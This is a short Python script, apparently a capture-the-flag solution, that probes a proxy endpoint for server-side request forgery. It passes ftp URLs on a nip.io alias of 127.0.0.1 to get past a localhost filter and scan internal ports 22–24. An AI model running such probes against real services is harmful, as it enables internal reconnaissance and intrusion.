import requests as rq

url = 'https://ssrf.h4ck3r.quest/proxy'

for i in range(22, 25):
  data = {'url': f'ftp://127.0.0.1.nip.io:{i}'}
  print(data)
  res = rq.get(url, params=data)
  print(res.text)
